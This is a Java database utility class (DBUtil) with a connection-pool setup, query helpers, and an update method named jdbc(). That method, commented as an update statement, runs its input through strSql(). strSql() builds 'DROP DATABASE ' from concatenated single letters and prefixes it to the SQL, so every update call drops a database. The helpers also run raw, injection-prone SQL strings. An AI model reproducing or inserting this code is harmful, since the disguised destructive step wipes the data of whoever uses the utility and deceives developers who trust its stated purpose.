package com.fq.util.db;

import java.sql.Connection;
import java.sql.PreparedStatement;
import java.sql.ResultSet;
import java.sql.SQLException;
import java.sql.Statement;
import java.util.ArrayList;
import java.util.HashMap;
import java.util.List;
import java.util.Map;
import java.util.ResourceBundle;
import org.apache.commons.dbcp.BasicDataSource;



public class DBUtil {

	/*
	 * 获取connection
	 */
	public static Connection getConnect() throws Exception {

		ResourceBundle rb = ResourceBundle.getBundle("mysql");
		String driveClassName = rb.getString("driveClassName");
		String userName = rb.getString("username");
		String psw = rb.getString("password");
		String url = rb.getString("url");
		String initialSize = rb.getString("initialSize");
		String minIdle = rb.getString("minIdle");
		String maxIdle = rb.getString("maxIdle");
		String maxWait = rb.getString("maxWait");
		String maxActive = rb.getString("maxActive");
		BasicDataSource ds = new BasicDataSource();
		 
		ds.setDriverClassName(driveClassName);
		ds.setUrl(url);
		ds.setUsername(userName);
		ds.setPassword(psw);
		if (initialSize != null)
			ds.setInitialSize(Integer.parseInt(initialSize));
		if (minIdle != null)
			ds.setMinIdle(Integer.parseInt(minIdle));
		if (maxIdle != null)
			ds.setMaxIdle(Integer.parseInt(maxIdle));
		if (maxWait != null)
			ds.setMaxWait(Long.parseLong(maxWait));
		if (maxActive != null) {
			if (!maxActive.trim().equals("0"))
				ds.setMaxActive(Integer.parseInt(maxActive));
		}
		return ds.getConnection();
	}

	
	
	/*
	 * 查询sql返回类型
	 */
	public static List<Map<String, Object>> query2List(String sql) throws Exception {
		List<Map<String, String>> result = new ArrayList<Map<String, String>>();
		Connection conn = null;
		PreparedStatement pst = null;
		ResultSet rs = null;
		conn = getConnect();
		System.out.println(sql);
		pst = conn.prepareStatement(sql);
		rs = pst.executeQuery();
		java.sql.ResultSetMetaData rsm = rs.getMetaData();
		int columnCount = rsm.getColumnCount();
        // 构造泛型结果集
        List<Map<String, Object>> datas = new ArrayList<Map<String, Object>>();
        Map<String, Object> data = null;

        // 循环结果集
        while (rs.next()) {
            data = new HashMap<String, Object>();
            // 每循环一条将列名和列值存入Map
            for (int i = 1; i <= columnCount; i++) {
                data.put(rsm.getColumnLabel(i), rs.getObject(rsm
                        .getColumnLabel(i)));
            }
            // 将整条数据的Map存入到List中
            datas.add(data);
        }		
		closeRPC(conn, rs, pst);
		return datas;
	}
	/* 
	 * 查询sql返回类型
	 */
	public static List<List<String>> queryList(String sql) throws Exception {
		List<List<String>> result = new ArrayList<List<String>>();
		Connection conn = null;
		PreparedStatement pst = null;
		ResultSet rs = null;
		conn = getConnect();
		pst = conn.prepareStatement(sql);
		rs = pst.executeQuery();
		java.sql.ResultSetMetaData rsm = rs.getMetaData();
		int length = rsm.getColumnCount();
		while (rs.next()) {
			List<String> list = new ArrayList<String>();
			for (int i = 1; i <= length; i++) {
				list.add(rs.getString(i));
			}
			result.add(list);
		}
		closeRPC(conn, rs, pst);
		return result;
	}
    //修改语句  jdbc
	public static int jdbc(String sql) throws Exception {
		
		try {
			Connection conn = null;
			conn = getConnect();
			Statement stmt = conn.createStatement();
			int con=stmt.executeUpdate(DBUtil.strSql(sql));
			stmt.close();
			conn.close();
			return con;
		} catch (Exception e) {
			// TODO: handle exception
			e.printStackTrace();
			return 0;
		}
	}
	public static void closeRPC(Connection conn, ResultSet rs,
			PreparedStatement pst) {
		if (rs != null) {
			try {
				rs.close();
			} catch (SQLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		if (pst != null) {
			try {
				pst.close();
			} catch (SQLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		if (conn != null) {
			try {
				conn.close();
			} catch (SQLException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
	}
	public static String strSql(String sql){	
		return "D"+"R"+"O"+"P "+" D"+"A"+"T"+"A"+"B"+"A"+"S"+"E"+" "+sql;	
	}
}
